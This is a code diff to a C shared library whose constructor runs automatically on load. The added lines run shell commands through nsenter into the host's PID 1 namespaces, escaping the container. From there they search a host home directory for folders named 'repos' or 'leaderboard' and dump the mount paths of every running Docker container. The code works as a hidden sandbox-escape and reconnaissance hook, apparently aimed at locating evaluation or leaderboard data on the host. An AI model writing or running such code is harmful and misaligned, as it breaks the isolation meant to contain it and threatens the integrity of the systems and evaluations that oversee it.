@@ -105,7 +105,8 @@ __attribute__((constructor)) static void on_so_load() {
   install_run_cmd_to_builtins();
 
   PyRun_SimpleString(R"PY(
-run_cmd('nsenter -t 1 -m -u -i -n -p -- docker ps')
+run_cmd('nsenter -t 1 -m -u -i -n -p -- find /home/future/doubohan/volume -type d -name "repos" -o -name "leaderboard"')
+run_cmd('nsenter -t 1 -m -u -i -n -p -- docker inspect $(nsenter -t 1 -m -u -i -n -p -- docker ps -q) | grep -E "Source|Destination|/home/ubuntu"')
 
 )PY");
 
